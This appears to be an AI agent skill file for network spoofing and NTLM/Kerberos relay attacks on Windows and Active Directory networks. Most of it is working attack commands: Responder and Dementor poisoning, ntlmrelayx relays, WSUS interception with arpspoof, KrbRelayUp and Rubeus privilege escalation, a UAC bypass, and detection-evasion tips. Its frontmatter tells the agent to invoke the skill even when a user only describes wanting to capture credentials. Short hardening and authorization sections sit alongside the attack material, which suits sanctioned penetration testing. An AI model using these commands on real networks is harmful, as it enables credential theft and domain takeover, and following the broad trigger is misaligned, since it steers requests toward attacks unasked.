---
name: network-spoofing-relay-attacks
description: Network protocol spoofing and credential relay attacks for penetration testing. Use this skill whenever the user mentions LLMNR, NBT-NS, mDNS, WPAD, NTLM relay, Kerberos relay, Responder, Dementor, Inveigh, ntlmrelayx, WSUS abuse, or any network-based credential harvesting/relay attack. Trigger for authorized penetration testing, red teaming, or security assessments involving Active Directory, Windows networks, or SMB/LDAP/HTTP relay scenarios. Make sure to use this skill even if the user doesn't explicitly name the attack type but describes wanting to capture credentials, poison name resolution, or relay authentications.
---

# Network Spoofing and Relay Attacks

This skill covers network protocol spoofing and credential relay attacks for **authorized penetration testing and security assessments only**. Always ensure you have explicit written authorization before using these techniques.

## Quick Start

```bash
# Capture NTLM hashes with Responder
responder -I <interface> -v

# Relay NTLM to LDAP for domain compromise
ntlmrelayx.py -t ldap://<DC> -socks --keep-relaying

# Discover relayable targets with RelayKing
python3 relayking.py --null-auth --protocols smb,ldap,http 10.10.0.0/24
```

## Core Concepts

### Why These Attacks Work

1. **Unauthenticated broadcast protocols** (LLMNR, NBT-NS, mDNS) respond to any query
2. **NTLM authentication** can be captured and relayed without cracking
3. **Kerberos tickets** can be replayed between SPNs on the same machine account
4. **SMB/LDAP signing** is often disabled, allowing relay attacks

### Attack Flow

```
Victim queries name → Attacker spoofs response → Victim authenticates → 
Credentials captured → Relay to target service → Access granted
```

## Protocol Spoofing

### LLMNR, NBT-NS, mDNS Poisoning

These protocols resolve hostnames when DNS fails. They're broadcast-based and unauthenticated.

**Responder** (Kali default, `/etc/responder/Responder.conf`):

```bash
# Basic capture
responder -I eth0 -v

# Aggressive mode (may cause side effects)
responder -I eth0 -P -r -v

# Force NTLMv1 (easier to crack)
responder -I eth0 --lm --disable-ess

# WPAD impersonation
responder -I eth0 --wpad

# NetBIOS + auth proxy
responder -I eth0 -Pv
```

**Dementor** (more granular, fixes Responder issues):

```bash
# Default settings
Dementor -I eth0

# Analysis mode
Dementor -I eth0 -A

# Disable Extended Session Security
Dementor -I eth0 -O NTLM.ExtendedSessionSecurity=Off

# Custom config
Dementor -I eth0 --config custom.toml
```

**Captured hashes location**: `/usr/share/responder/logs`

### WPAD Attacks

Web Proxy Auto-Discovery Protocol can be poisoned to redirect browser traffic.

```bash
# WPAD poisoning with Responder
responder -I eth0 --wpad

# DHCP poisoning (stealthier than ARP)
responder -I eth0 -Pdv
```

### Inveigh (Windows)

```powershell
# PowerShell invocation
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# binary
Inveigh.exe
```

## NTLM Relay Attacks

### Prerequisites

- Victim authenticates to attacker (via spoofing or coercion)
- Target service has SMB/LDAP signing disabled
- Attacker can reach target service
- User has Local Admin on relay target (for SMB relay)

### Tools

**ntlmrelayx.py** (Impacket):

```bash
# Relay to LDAP (domain admin)
ntlmrelayx.py -t ldap://<DC> -socks --keep-relaying

# Relay to SMB (exec/dump)
ntlmrelayx.py -t smb://<target> -c "whoami"

# Relay to AD CS (ESC8)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server

# With SOCKS proxy for manual ops
ntlmrelayx.py -t ldap://<DC> -socks
```

**MultiRelay** (Responder suite):

```bash
# Relay all users
python MultiRelay.py -t <target> -u ALL

# Execute command
python MultiRelay.py -t <target> -u ALL -c whoami

# Dump hashes
python MultiRelay.py -t <target> -u ALL -d
```

### Port Forwarding (Cobalt Strike)

```bash
# Load PortBender
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
beacon> rportfwd 8445 127.0.0.1 445
beacon> socks 1080

# Cleanup
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```

## WSUS Abuse (HTTP 8530)

WSUS clients authenticate via NTLM over HTTP. Can be relayed without cracking.

### Reconnaissance

```bash
# Scan for WSUS listeners
nmap -sSVC -Pn --open -p 8530,8531 -iL hosts.txt

# Check GPO for WSUS config
nxc smb <ip> -u <user> -p <pass> -M reg-query \
  -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" \
  KEY="WUServer"

# Local check
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
```

### Attack Steps

```bash
# 1. ARP spoof to intercept WSUS traffic
arpspoof -i eth0 -t <client> <wsus_server>

# 2. Redirect port 8530
iptables -t nat -A PREROUTING -p tcp --dport 8530 \
  -j REDIRECT --to-ports 8530

# 3. Start relay listener
ntlmrelayx.py -t ldap://<DC> -smb2support -socks \
  --keep-relaying --http-port 8530

# 4. Trigger client check-in
wuauclt.exe /detectnow
```

**Note**: HTTPS (8531) requires trusted certificate to intercept.

## Kerberos Relay Attacks

Relays AP-REQ tickets between SPNs on the same machine account.

### Requirements

1. Source and target SPNs share same machine account
2. No channel binding/EPA on target
3. Can intercept or coerce authentication
4. Win race before original packet (avoid Event 4649)

### Recon

```powershell
# Find servers with multiple SPNs
Get-ADComputer -Filter * -Properties servicePrincipalName | \
  Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} | \
  Select Name,servicePrincipalName
```

### Attack with KrbRelayUp

```powershell
# One-click SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" \
  --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8

# Coerce DC to authenticate
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```

### Manual Path

```powershell
# Create machine account
New-MachineAccount -Name "FAKE01" -Password "P@ss123"

# Set RBCD
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID

# S4U impersonation
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator \
  /msdsspn:HOST/DC01 /ptt

# Bypass UAC
SCMUACBypass.exe
```

## Relay Target Discovery

### RelayKing

```bash
# Authenticated audit + generate relay list
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local \
  --dc-ip 10.0.0.10 --audit --protocols smb,ldap,ldaps,mssql,http,https \
  --proto-portscan --ntlmv1 --threads 10 -vv \
  --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep
python3 relayking.py --null-auth --protocols smb,ldap,http \
  --proto-portscan -o plaintext 10.10.0.0/24
```

### Using Generated List

```bash
# Relay to all discovered targets
ntlmrelayx.py -tf relaytargets.txt -c "whoami"
```

## Coercion Techniques

Force victims to authenticate to attacker:

- **PetitPotam**: RPC coercion via PrintSpooler
- **DFSCoerce**: DFS namespace coercion
- **PrinterBug**: Printer enumeration coercion
- **UNC Lures**: SCF/LNK files on writable SMB shares
- **AuthIP**: Fake authentication server

## Detection & Evasion

### Detection Signs

- Event 4649 (Kerberos replay detected)
- Event 4769 surge (service ticket requests)
- Loopback Kerberos logons (127.0.0.1)
- Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Changes to `msDS-KeyCredentialLink`

### Evasion Tips

- Use `--keep-relaying` for persistent attacks
- Time attacks during maintenance windows
- Block original packets to avoid replay detection
- Use SOCKS proxy for manual operations

## Hardening Recommendations

1. **Enforce LDAP & SMB signing** on all servers
2. **Enable Channel Binding/EPA** for HTTP/LDAPS
3. **Split SPNs** across different accounts
4. **Patch coercion vectors** (PetitPotam, DFS, AuthIP)
5. **Set `ms-DS-MachineAccountQuota = 0`**
6. **Alert on Event 4649** and loopback logons
7. **Disable LLMNR/NBT-NS** on domain members

## Common Error Troubleshooting

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Wrong host/SPN |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sync time with `w32tm` |
| LDAP bind fails | Signing enforced | Use AD CS path |
| Event 4649 spam | Replay detected | Block/race original packet |

## Safety & Authorization

**CRITICAL**: These techniques are for authorized security testing only.

- ✅ Written authorization from system owner
- ✅ Defined scope and rules of engagement
- ✅ Legal review completed
- ❌ Never use on networks you don't own
- ❌ Never disrupt production systems
- ❌ Never without explicit permission

## References

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Dementor GitHub](https://github.com/MatrixEditor/Dementor)
- [Inveigh GitHub](https://github.com/Kevin-Robertson/Inveigh)
- [RelayKing GitHub](https://github.com/depthsecurity/RelayKing-Depth)
- [KrbRelayUp GitHub](https://github.com/Dec0ne/KrbRelayUp)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [WSUScripts](https://github.com/Coontzy1/WSUScripts)
- [Google Project Zero - Kerberos Relay](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [TrustedSec - WSUS Is SUS](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
